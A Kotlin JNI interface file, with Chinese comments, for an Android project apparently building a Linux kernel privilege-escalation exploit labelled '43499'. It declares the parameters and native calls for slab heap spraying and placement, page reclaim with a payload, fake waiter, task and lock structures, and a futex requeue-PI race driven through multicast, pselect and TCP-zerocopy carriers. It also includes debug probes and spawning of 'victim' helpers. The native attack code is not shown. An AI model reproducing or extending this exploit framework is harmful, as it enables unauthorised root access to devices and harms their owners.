package com.ghostlock.app.jni

import androidx.annotation.Keep

/**
 * Placement 不可拆事务的显式物理参数；不包含 profile 或 route。
 *
 * @note ABI v4（R2）：新增 slabOrder/mmStructSize/mmPartials/prepareSlabs/
 *   snitchCollisions/pollUs 与 A 决策 8 个容量/协议字段（identity/LEAK_TAG/
 *   staging/max_*），全部为必填（无默认值）；与 C 头 `core/placement.h`
 *   的 append-only 字段一一对应。
 */
@Keep
internal data class Native43499PlacementRequest(
    val pageSize: Long,
    val allocationSize: Long,
    val requiredAlignment: Long,
    val scanLowerBound: Long,
    val scanUpperBound: Long,
    val scanStep: Long,
    val scanRoundLimit: Long,
    val timeoutNanos: Long,
    val placementCpu: Int,
    val measurementCpu: Int,
    val objectsPerSlab: Int,
    val prepareObjectCount: Int,
    val sprayObjectCount: Int,
    val preObjectCount: Int,
    val postObjectCount: Int,
    val slabOrder: Long,
    val mmStructSize: Long,
    val mmPartials: Long,
    val prepareSlabs: Long,
    val snitchCollisions: Long,
    val pollUs: Long,
    /* R2（A 决策）：原 Native STRUCT_/WIRE_ 常量改为请求字段（全部必填）。 */
    val identityStart: Long,
    val identityEnd: Long,
    val leakTagNibble: Long,
    val leakTagShift: Long,
    val stagingCapacity: Long,
    val maxContextEntries: Long,
    val maxObjectsPerSlab: Long,
    val maxMeasurementRounds: Long,
)

/** Landing 的显式几何；最终页面字节由 [Native43499Jni.landPage] 单独传入。 */
@Keep
internal data class Native43499LandingRequest(
    val expectedPageBase: Long,
    val pageSize: Long,
    val allocationSize: Long,
    val requiredAlignment: Long,
    val reclaimPayloadSize: Long,
    val socketSendBufferSize: Long,
    val reclaimSendLimit: Long,
    val timeoutNanos: Long,
    val fillByte: Long,
    /* R3a-2/B6 append-only：页接受判据（参数化 legacy2 memory.cpp:210-227）。
     * required=1 时 Native 要求 (candidate+offset) 的第 bit 位为 1，否则拒绝本次
     * landing（Placement 不消费）；required=0 表示本 route 无判据。 */
    val pageAcceptRequired: Long,
    val pageAcceptOffset: Long,
    val pageAcceptBit: Long,
)

/** 三线程 Actor 的物理调度与有界等待参数。 */
@Keep
internal data class Native43499ActorSetup(
    val ownerCpu: Int,
    val waiterCpu: Int,
    val consumerCpu: Int,
    val ownerPriority: Int,
    val waiterPriority: Int,
    val consumerPriority: Int,
    val threadCount: Int,
    val prepareTimeoutNanos: Long,
    val parkedTimeoutNanos: Long,
    val executionTimeoutNanos: Long,
    val shutdownTimeoutNanos: Long,
    val consumerMax: Long,
    val consumerBurst: Long,
    val lockPiSpinNs: Long,
    val pollUs: Long,
    val setupSettleUs: Long,
    val requeueExpected: Long,
    val disarmSpinLimit: Long,
)

/** prepareActor 时绑定的物理 Carrier；executeActor 不再接收该对象。 */
@Keep
internal sealed interface Native43499PrimitiveSpec {
    /**
     * L1：显式 primitive kind（与 Native `GLK43499_PRIMITIVE_*` 同值；JNI 直接读取，
     * 不再按 JVM 类名 `IsInstanceOf` 判类）。
     */
    val primitiveKind: Int

    val finalWaiterAddress: Long
    val finalTaskAddress: Long
    val finalLockAddress: Long
    val frameBytes: ByteArray

    companion object {
        /** Native `GLK43499_PRIMITIVE_MULTICAST_SENDMSG`。 */
        const val KIND_MULTICAST_SENDMSG: Int = 1
        /** Native `GLK43499_PRIMITIVE_PSELECT`。 */
        const val KIND_PSELECT: Int = 2
        /** Native `GLK43499_PRIMITIVE_TCP_ZEROCOPY_RECEIVE`。 */
        const val KIND_TCP_ZEROCOPY_RECEIVE: Int = 3
    }
}

/** Multicast sendmsg Carrier 参数。 */
@Keep
internal data class Native43499MulticastSpec(
    override val finalWaiterAddress: Long,
    override val finalTaskAddress: Long,
    override val finalLockAddress: Long,
    override val frameBytes: ByteArray,
    val socketBufferSize: Long,
    val operationBudget: Long,
    val timeoutNanos: Long,
    val addressFamily: Int,
    val armHoldNs: Long,
    val armSequence: Long,
    /* R2（A 决策）：帧容量上限与 ghost disarm 参数（全部必填，无默认值）。 */
    val maxFrame: Long,
    val ghostPid: Int,
    val futexWaiterFlag: Long,
    val disarmRequired: Int,
    /* L1：JNI 显式 primitive kind；构造方必须显式给出（禁止 JNI 判类）。 */
    override val primitiveKind: Int,
) : Native43499PrimitiveSpec

/** Pselect Carrier 参数。 */
@Keep
internal data class Native43499PselectSpec(
    override val finalWaiterAddress: Long,
    override val finalTaskAddress: Long,
    override val finalLockAddress: Long,
    override val frameBytes: ByteArray,
    val descriptorCapacity: Long,
    val operationBudget: Long,
    val timeoutNanos: Long,
    val perAttemptDelayNs: Long,
    /* R2（A 决策）：nfds 容量上限来自请求（与 FD_SETSIZE 取小）。 */
    val maxNfds: Long,
    /* R3a-2/P1：consumer 起跑延迟（ns；旧 enter_delay_us）。 */
    val enterDelayNs: Long,
    /* R3a-2/P10：备份/安装 fd 的起点步长（旧 nfds+64；替代 FD_SETSIZE 偏移）。 */
    val fdReserveStride: Long,
    /* R3a-2/P7：0=pselect 分支，1=select(timeval) 分支。 */
    val selectUseTimeval: Long,
    /* L1：JNI 显式 primitive kind；构造方必须显式给出（禁止 JNI 判类）。 */
    override val primitiveKind: Int,
) : Native43499PrimitiveSpec

/** TCP zerocopy receive Carrier 参数。 */
@Keep
internal data class Native43499TcpZerocopySpec(
    override val finalWaiterAddress: Long,
    override val finalTaskAddress: Long,
    override val finalLockAddress: Long,
    override val frameBytes: ByteArray,
    val mappingSize: Long,
    val receiveSize: Long,
    val mappingOffset: Long,
    val operationBudget: Long,
    val timeoutNanos: Long,
    val punchSpin: Long,
    val postHoldNs: Long,
    val zcAddressOffset: Long,
    /* R2（A 决策）：fill_byte 唯一归属 landing_request；映射/帧容量上限进请求。 */
    val maxMapping: Long,
    val maxFrame: Long,
    /* R3a-2/T4：arm 序列（旧 >=16 才 arm）。 */
    val armSequence: Long,
    /* R3a-2/T2/T3：zc 请求体四字段最终偏移（旧三版 0x18/0x20/0x28/0x30；
     * 白名单由 generator 负责，Native 只校验对齐/界内/不重叠）。 */
    val zcLengthOffset: Long,
    val zcTaskOffset: Long,
    val zcLockOffset: Long,
    /* R3a-2：punch 相位等待的独立自旋上限。 */
    val punchPhaseSpin: Long,
    /* R3b：发送小包与 zerocopy 映射页的填充字节各有唯一来源
     * （legacy2 `route_tcp_session.cpp:61-64`：send=0x33 / mapping=0x55）。
     * 不复用 landing_request.fillByte（A 决策：每个物理使用者一个请求字段）。 */
    val sendFillByte: Long,
    val mappingFillByte: Long,
    /* L1：JNI 显式 primitive kind；构造方必须显式给出（禁止 JNI 判类）。 */
    override val primitiveKind: Int,
) : Native43499PrimitiveSpec

/** JNI 写回的公共调用回执；业务层不得只凭该对象宣布目标效果成功。 */
@Keep
internal open class Native43499CallResult {
    /** Native 尚未写回时的非协议哨兵；具名状态表必须由后续生成任务产生。 */
    var callStatus: Int = Int.MIN_VALUE
    var effect: Int = 0
    var resourceState: Int = 0
    var systemError: Int = 0
    var retainedResourceCount: Long = 0
}

/** cancel/close 回执。 */
@Keep
internal class Native43499CloseResult : Native43499CallResult() {
    var stopRequested: Boolean = false
    var workersJoined: Boolean = false
    var ownedChainReleased: Boolean = false
    var retainedForProcessExit: Boolean = false
}

/**
 * G06 RLIMIT 回执（`raiseProcessLimits`；机制值 before/after）。
 *
 * @property nofileSoftBefore/After NOFILE soft 前/后值（rlim_t 64-bit）。
 * @property nofileHard NOFILE hard 值（本入口不改 hard）。
 * @property nofileStatus RLIMIT_NOFILE 子状态（0=成功；否则 errno）。
 * @property nprocSoftBefore/After NPROC soft 前/后值。
 * @property nprocHard NPROC hard 值。
 * @property nprocStatus RLIMIT_NPROC 子状态（0=成功；否则 errno）。
 * @note callStatus/systemError 由 [Native43499CallResult] 承载；callStatus 最后写。
 * @note @Keep 固定 JVM 类名，供 C 侧 `Native43499LimitsResult` 查找字段。
 */
@Keep
internal class Native43499LimitsResult : Native43499CallResult() {
    var nofileSoftBefore: Long = 0
    var nofileHard: Long = 0
    var nofileSoftAfter: Long = 0
    var nofileStatus: Int = 0
    var nprocSoftBefore: Long = 0
    var nprocHard: Long = 0
    var nprocSoftAfter: Long = 0
    var nprocStatus: Int = 0
}

/** preparePlacement 回执和候选页事实。 */
@Keep
internal class Native43499PlacementResult : Native43499CallResult() {
    var candidatePageBase: Long = 0
    var pageSize: Long = 0
    var allocationSize: Long = 0
    var requiredAlignment: Long = 0
    var measuredObjectAddress: Long = 0
    var measurementRounds: Long = 0
    var retainedChildCount: Long = 0
    var retainedDescriptorCount: Long = 0
    /* task-100：placement 失败机制诊断（数值枚举；append-only）。 */
    var diagStep: Int = 0
    var diagSyscall: Int = 0
    var diagErrno: Int = 0
    /* task-109：leak child open 失败证据（pid 复用/已退出判别）。 */
    var diagChildReaped: Int = 0
    var diagChildStatus: Int = 0
    var diagChildProcExists: Int = 0
    var diagChildUid: Int = 0
    var diagOpenErrno: Int = 0
    var diagChildPid: Int = 0
}

/** landPage 的提交点和物理操作事实。 */
@Keep
internal class Native43499LandingResult : Native43499CallResult() {
    var actualPageBase: Long = 0
    var contentGeneration: Long = 0
    var closedPrepareCount: Long = 0
    var closedSprayCount: Long = 0
    var closedPreCount: Long = 0
    var closedPostCount: Long = 0
    var reclaimSendCount: Long = 0
    var commitReached: Boolean = false
    var placementConsumed: Boolean = false
    var reclaimRetained: Boolean = false
    /* R3a-2/B6：页接受判据的求值回执（未启用时 checked=false）。 */
    var pageAcceptValue: Long = 0
    var pageAcceptChecked: Boolean = false
    var pageAcceptOk: Boolean = false
}

/** prepareActor 的 Page 所有权转移、三线程和 Carrier 准备事实。 */
@Keep
internal class Native43499ActorPrepareResult : Native43499CallResult() {
    var pageContentGeneration: Long = 0
    var primitiveKind: Int = 0
    var threadCount: Int = 0
    var pageConsumed: Boolean = false
    var ownerReady: Boolean = false
    var waiterReady: Boolean = false
    var consumerReady: Boolean = false
    var carrierPrepared: Boolean = false
}

/** executeActor 的纯物理事实；线程和所拥有Page的终结只看close回执。 */
@Keep
internal class Native43499ActorExecuteResult : Native43499CallResult() {
    var pageContentGeneration: Long = 0
    var consumerCallCount: Long = 0
    var consumerSuccessCount: Long = 0
    var consumerInflightAtReturn: Long = 0
    var ownerReady: Boolean = false
    var waiterParked: Boolean = false
    var carrierArmed: Boolean = false
    var windowOpened: Boolean = false
    var carrierDisarmed: Boolean = false
    var retainedForProcessExit: Boolean = false
    /* R3a-2：Carrier 中性操作计数与失败定位（可证伪诊断；不参与成功判据）。 */
    var carrierOperations: Long = 0
    var carrierError: Int = 0
    var carrierLastStep: Int = 0
    var carrierLastErrno: Int = 0
    var carrierPunchFailed: Int = 0
    /* R3a-2/B7：multicast ghost disarm 的 FUTEX_LOCK_PI ret/errno。 */
    var ghostDisarmResult: Int = 0
    var ghostDisarmErrno: Int = 0
    /* task-102：actor 阶段诊断（PI 窗口内不 IO/日志；仅回执字段）。 */
    var diagStage: Int = 0
    var diagRequeueRet: Int = 0
    var diagRequeueErrno: Int = 0
    /* task-105：首次失败阶段（冻结）+ 调用计数。 */
    var diagFailStage: Int = 0
    var diagPublishCount: Int = 0
    var diagRequeueCalls: Int = 0
    /* task-107：版本 marker + requeue 前 waiter/owner 就绪快照。 */
    var diagVersion: Int = 0
    var diagWaiterWaiting: Int = 0
    var diagOwnerStarted: Int = 0
    var diagRequeueExpected: Int = 0
    /* task-108：waiter futex 证据 + 时序快照。 */
    var diagWaiterWaitRet: Int = 0
    var diagWaiterWaitErrno: Int = 0
    var diagWaiterInFutex: Int = 0
    var diagWaiterDispatched: Int = 0
    var diagTargetValueAtRequeue: Int = 0
    var diagTsSettleDoneNs: Long = 0
    var diagTsWaiterEnterNs: Long = 0
    var diagTsWaiterExitNs: Long = 0
    var diagTsRequeueNs: Long = 0
    /* task-110：futex 实参/实际 timeout 证据。 */
    var diagParkedTimeoutNs: Long = 0
    var diagSetupSettleUs: Long = 0
    var diagPollUs: Long = 0
    var diagPrepareTimeoutNs: Long = 0
    var diagTsSec: Long = 0
    var diagTsNsec: Long = 0
    var diagFutexOp: Int = 0
    var diagFutexVal: Int = 0
    var diagFutexUaddr2: Int = 0
    var diagFutexVal3: Int = 0
    var diagOwnerTid: Int = 0
}

/**
 * perf 采样 open 的 15 个物理参数；全部必填（无默认值，A 决策）。
 *
 * @property pid 被采样进程主线程 TID；0 表示当前进程。
 * @property cpu 必须为 -1（per-task 事件）。
 * @property attrType/attrConfig/attrSamplePeriod/attrSampleType/attrSampleRegsIntr
 *   `perf_event_attr` 的显式字段（机制零值之外的字段由 Native `{0}` 初始化）。
 * @property attrFlags `perf_event_open` 的 flags 参数。
 * @property attrDisabled/autoEnable 事件初始 disabled 与 open 后自动 enable。
 * @property excludeUser/excludeHv/excludeIdle 排除上下文位。
 * @property pageSize 必须等于本机页大小；ringPages 为环数据页数。
 * @note 阶段：R3e；默认关闭（perf.enabled=0），G1 门禁后启用。
 */
@Keep
internal data class Native43499PerfOpenRequest(
    val pid: Long,
    val cpu: Long,
    val attrType: Long,
    val attrConfig: Long,
    val attrSamplePeriod: Long,
    val attrSampleType: Long,
    val attrSampleRegsIntr: Long,
    val attrFlags: Long,
    val attrDisabled: Long,
    val excludeUser: Long,
    val excludeHv: Long,
    val excludeIdle: Long,
    val pageSize: Long,
    val ringPages: Long,
    val autoEnable: Long,
)

/** openPerfSampler 的回执；`callStatus` 最后写（原子回执协议）。 */
@Keep
internal class Native43499PerfOpenResult : Native43499CallResult()

/** collectPerfSamples 的回执：公共回执 + 环几何/游标事实（绝对位置）。 */
@Keep
internal class Native43499PerfCollectResult : Native43499CallResult() {
    /** mmap 内环数据区偏移。 */
    var dataOffset: Long = 0

    /** 环数据区字节数。 */
    var dataSize: Long = 0

    /** 单调绝对 data_head（自事件创建起累计写入字节）。 */
    var dataHead: Long = 0

    /** 本次 collect 前的单调绝对 data_tail。 */
    var dataTailBefore: Long = 0

    /** 本次整块拷贝字节数（=dataSize）。 */
    var bytesCopied: Long = 0

    /** Native 是否已把 data_tail 推进到 data_head。 */
    var tailMoved: Boolean = false
}

/**
 * victim transport spawn 的 JNI 回执（批 B1）。
 *
 * @property pid helper PID（>0 成功；失败 0）。
 * @note 继承 [Native43499CallResult] 的 callStatus/effect/resourceState/systemError/
 *   retainedResourceCount；callStatus 最后写。
 */
@Keep
internal class VictimSpawnJniResult : Native43499CallResult() {
    /** helper PID（成功 >0）。 */
    var pid: Int = 0
}

/** victim transport close 的 JNI 回执（批 B1；仅公共 call 字段）。 */
@Keep
internal class VictimCloseJniResult : Native43499CallResult()

/**
 * 43499 的无状态 JNI transport。
 *
 * 本对象不缓存token、Page、Actor或结果；Kotlin wrapper唯一持有token并按
 * Placement→Page→Actor线性转移。伪造、复制或复用token不属于受支持调用。
 * 当前 native core 仅接入 fail-closed unavailable 实现，因此九个入口均返回
 * native 的 raw `UNSUPPORTED` 状态，不会产生伪成功或伪句柄。
 */
@Keep
internal object Native43499Jni {
    init {
        System.loadLibrary("ghostlock43499")
    }

    /** 创建并完成一次不可拆 Placement；失败返回 0。 */
    external fun preparePlacement(
        request: Native43499PlacementRequest,
        result: Native43499PlacementResult,
    ): Long

    /** 请求停止 Placement；不销毁 handle。 */
    external fun cancelPlacement(handle: Long, result: Native43499CloseResult): Int

    /** 终结Placement；wrapper必须先置0，回执区分释放或保留。 */
    external fun closePlacement(handle: Long, result: Native43499CloseResult): Int

    /**
     * 读取并抬升本进程 RLIMIT_NOFILE / RLIMIT_NPROC 的 soft 到 hard（G06 机制单步）。
     *
     * @param result 机制回执（before/after/errno；callStatus 最后写）。
     * @return GLK43499_CALL_* 总状态；-2=NOT_ACCEPTED（未调用）；INT32_MIN=INCOMPLETE。
     * @note 不 fork、不读 profile；失败由调用方 fail-closed（[ProcessLimits]）。
     */
    external fun raiseProcessLimits(result: Native43499LimitsResult): Int

    /**
     * task-111 debug-only：FUTEX_WAIT_REQUEUE_PI/CMP_REQUEUE_PI 机制自测。
     *
     * @param variant 0=val3=0；1=val3=owner_tid；2=waiter 绝对 CLOCK_REALTIME deadline。
     * @return int[10]（variant/owner_ret/owner_errno/owner_tid/waiter_ret/waiter_errno/
     *   waiter_elapsed_us/requeue_ret/requeue_errno/waiter_woke）；线程创建失败 null。
     */
    /**
     * A1 debug-only 单发 multicast probe（legacy1 consumer 语义；仅 Debug 库导出）。
     *
     * @param fakeLock page-derived fake lock（payload_base+0xe80）。
     * @param fakeTask page-derived fake task（payload_base+0x1280）。
     * @param fakeW0 page-derived fake waiter（payload_base+0x1180；记录用）。
     * @param pageBase placement candidatePageBase。
     * @param target 非安全 target（probe 固定 0x1000）。
     * @param timeoutMs 保留（legacy consumer 上限走 native 常量）。
     * @param consumerCpu consumer 线程 pin CPU（-1=不 pin）。
     * @param piWaiter true=创建 legacy waiter 线程（LOCK_PI chain + WAIT_REQUEUE_PI 1s），
     *   consumer 使用真实 waiter tid 做 PI walk。
     * @param waiterCpu waiter 线程 pin CPU（-1=不 pin）。
     * @param owner true=创建 legacy owner 线程（LOCK_PI(target)→waiter_ready→LOCK_PI(chain)）。
     * @param requeue true=stamp 前执行 CMP_REQUEUE_PI(1,(void*)1,target,val3=0)。
     * @param settleMs requeue 前 settle 毫秒（legacy setup_settle）。
     * @return 24 个 long：[ret, errno, calls, success, elapsedNs, target, fakeLock,
     *   fakeTask, fakeW0, pageBase, consumerCpu, step, waiterWaitRet, waiterWaitErrno,
     *   waiterTid, waiterCpu, ownerLockRet, ownerLockErrno, ownerChainRet,
     *   ownerChainErrno, requeueRet, requeueErrno, ownerStarted, settleMs]。
     * @note debug-only；release 无该导出（只由 debug androidTest 调用）。
     */
    external fun mcast510Probe(
        fakeLock: Long,
        fakeTask: Long,
        fakeW0: Long,
        pageBase: Long,
        target: Long,
        timeoutMs: Long,
        consumerCpu: Int,
        piWaiter: Boolean,
        waiterCpu: Int,
        owner: Boolean,
        requeue: Boolean,
        settleMs: Int,
    ): LongArray

    external fun actorFutexSelfTest(variant: Int): IntArray
    external fun actorDebugSnapshot(handle: Long): LongArray

    /** 消费 Placement 并产生 Page；[finalBytes] 只在本次调用期间借用。 */
    external fun landPage(
        placement: Long,
        request: Native43499LandingRequest,
        finalBytes: ByteArray,
        contentGeneration: Long,
        result: Native43499LandingResult,
    ): Long

    /** 终结尚未转移给Actor的Page；wrapper必须先置0。 */
    external fun closePage(page: Long, result: Native43499CloseResult): Int

    /** 成功时消费Page，并在线程创建前绑定、深拷贝[primitive]。 */
    external fun prepareActor(
        page: Long,
        setup: Native43499ActorSetup,
        primitive: Native43499PrimitiveSpec,
        result: Native43499ActorPrepareResult,
    ): Long

    /** 执行 prepare 时已经绑定的 Carrier；本入口没有 tag/spec 参数。 */
    external fun executeActor(actor: Long, result: Native43499ActorExecuteResult): Int

    /** 请求停止新触发并排空 Actor；不销毁 handle。 */
    external fun cancelActor(actor: Long, result: Native43499CloseResult): Int

    /** 终结Actor、Carrier及Actor拥有的Page；wrapper必须先置0。 */
    external fun closeActor(actor: Long, result: Native43499CloseResult): Int

    /**
     * 打开一次 perf 采样事件（机制入口；不解析样本）。
     *
     * @param request 15 个显式物理参数（全必填）。
     * @param result 回执；callStatus 最后写。
     * @return 成功为新无状态 token；失败 0 或三态哨兵。
     */
    external fun openPerfSampler(
        request: Native43499PerfOpenRequest,
        result: Native43499PerfOpenResult,
    ): Long

    /**
     * 停止采样并把环数据区整块拷贝到 [out]（机制入口；不解析样本）。
     *
     * @param handle openPerfSampler 返回的 token（不消费）。
     * @param out 输出 ByteArray；容量必须 >= dataSize。
     * @param result 环事实回执。
     * @return call_status 或三态哨兵。
     */
    external fun collectPerfSamples(
        handle: Long,
        out: ByteArray,
        result: Native43499PerfCollectResult,
    ): Int

    /**
     * 终结 perf 采样会话并消费 token（无状态句柄；close 唯一性由 owner 保证）。
     *
     * @param handle 仍由调用方唯一持有的 token。
     * @param result 终结回执。
     * @return call_status 或三态哨兵。
     */
    external fun closePerfSampler(handle: Long, result: Native43499CloseResult): Int
    /* ------------------------------------------------------------------ */
    /* JNI 三态返回值（与 `jni43499.c` 的同名 #define 一一对应，F-C）        */
    /* ------------------------------------------------------------------ */

    /**
     * int 入口：前置拒绝（result 对象缺失/类型不符、token 前置条件不满足、输入翻译失败）。
     *
     * 语义：JNI **未调用** core、**未写回执**、token **未被消费** ⇒ owner 必须恢复 token。
     */
    const val RESULT_NOT_ACCEPTED_INT: Int = -2

    /**
     * int 入口：已调用 core，但回执字段无法完整写回（`callStatus` 最后写，写失败即此值）。
     *
     * 语义：**fail-stop**。owner 必须丢弃旧 token、不得恢复/重试/close，也不得信任回执。
     */
    const val RESULT_INCOMPLETE_INT: Int = Int.MIN_VALUE

    /** handle 入口：前置拒绝（同上）；0 仍表示正常的无效 handle。 */
    const val RESULT_NOT_ACCEPTED_HANDLE: Long = -2L

    /** handle 入口：已调用 core 但回执不完整；fail-stop，不得使用/恢复/close。 */
    const val RESULT_INCOMPLETE_HANDLE: Long = -1L
}

/**
 * 通用 victim transport 的无状态 JNI 入口（批 B1；类名不带 backend 词，供
 * `core/victim/VictimNativeJni` 引用而不引入 backend 依赖）。
 *
 * 全部入口 1:1 包装 `app/src/main/cpp/gl43499/core/victim_protocol.h`：
 * spawn=posix_spawn helper，send/receive=控制线帧搬运，readRaw/rawSize=memfd 拷贝，
 * waitExit/kill=waitpid/reap，detach/close=父侧资源释放。**不解析帧内容**。
 *
 * @note 返回值协议：handle 入口 -2/-1（NOT_ACCEPTED/INCOMPLETE），int 入口 -2/
 *   INT32_MIN；其余负值为 `GLK_VICTIM_ERR_*`（-1001..-1005），由 Kotlin 映射。
 * @note token=Native 指针；仅 Kotlin owner（VictimSession）保证 close/detach 一次。
 */
internal object VictimTransportJni {
    init {
        System.loadLibrary("ghostlock43499")
    }

    /**
     * posix_spawn 一个通用 helper。
     *
     * @param helperPath helper PIE 绝对路径（≤4096 UTF-8 字节）。
     * @param argv argv（1..16 项、每项 ≤512 字节、非空）。
     * @param env env（0..16 项；空=继承调用方环境）。
     * @param rawSizeBytes raw memfd 容量（≥16）。
     * @param result 启动回执（pid/callStatus）。
     * @return token（0=失败）或三态哨兵。
     */
    external fun spawnVictim(
        helperPath: String,
        argv: Array<String>,
        env: Array<String>,
        rawSizeBytes: Long,
        result: VictimSpawnJniResult,
    ): Long

    /**
     * 写入一个完整控制线帧（含 4 字节长度前缀）。
     *
     * @param handle 有效 token。
     * @param frame 完整线帧（Kotlin VictimProtocol 编码）。
     * @param timeoutMs 有界写超时（毫秒；>0）。
     * @return 成功=写入字节数；失败=负错误码/哨兵。
     */
    external fun sendVictim(handle: Long, frame: ByteArray, timeoutMs: Int): Int

    /**
     * 读取一个完整控制线帧。
     *
     * @param handle 有效 token。
     * @param out 输出缓冲（容量 ≥ 线帧最大长度 WIRE_MAX）。
     * @param timeoutMs 有界读超时（毫秒；>0）。
     * @return 成功=线帧长度；失败=负错误码/哨兵。
     */
    external fun receiveVictim(handle: Long, out: ByteArray, timeoutMs: Int): Int

    /**
     * 从 raw memfd 读取一段字节（不解析）。
     *
     * @param handle 有效 token。
     * @param offset memfd 偏移（≥0）。
     * @param out 输出缓冲（容量 ≥ length）。
     * @param length 读取长度（>0）。
     * @return 成功=length；失败=负错误码/哨兵。
     */
    external fun readRawVictim(
        handle: Long,
        offset: Long,
        out: ByteArray,
        length: Int,
    ): Int

    /**
     * @param handle 有效 token。
     * @return raw memfd 容量（>0）；失败=负错误码/哨兵。
     */
    external fun rawSizeVictim(handle: Long): Long

    /**
     * 有界等待 helper 退出并回收（超时不 kill）。
     *
     * @param handle 有效 token。
     * @param timeoutMs 有界等待（毫秒；>0）。
     * @return 退出码（≥0）；失败=负错误码/哨兵（TIMEOUT=-1003）。
     */
    external fun waitExitVictim(handle: Long, timeoutMs: Int): Int

    /**
     * 杀掉 helper 并回收。
     *
     * @param handle 有效 token。
     * @return 退出码（≥0）；失败=负错误码/哨兵。
     */
    external fun killVictim(handle: Long): Int

    /**
     * 只 detach 父侧传输资源（不 kill/wait；token 消费）。
     *
     * @param handle 有效 token。
     * @return 0 成功；负错误码/哨兵。
     */
    external fun detachVictim(handle: Long): Int

    /**
     * best-effort kill+reap+关闭父侧资源（token 消费；Kotlin owner 保证一次）。
     *
     * @param handle 有效 token。
     * @param result 终结回执。
     * @return 0 成功；负错误码/哨兵。
     */
    external fun closeVictim(handle: Long, result: VictimCloseJniResult): Int

    /**
     * E4 零 fork ①：读取本 DSO 链接单元 fork/vfork 累计计数（debug/measurement）。
     *
     * @return 高 32 位=fork 次数、低 32 位=vfork 次数。
     * @note 生产路径必须为 0；由 `--wrap=fork,--wrap=vfork` 计数。
     */
    external fun forkGuardSnapshot(): Long

    /**
     * E4 零 fork ①：清零本 DSO 的 fork/vfork 计数（仅测试 canary 使用）。
     *
     * @return 0。
     */
    external fun forkGuardReset(): Int

    /**
     * E4 零 fork ①“能失败”canary：故意 fork 一次并立即回收（仅测试）。
     *
     * @return 0=成功；负 errno。
     * @note 子进程立即 `_exit(0)`；**任何生产/JNI 业务路径不得调用**。
     */
    external fun forkGuardCanary(): Int
}
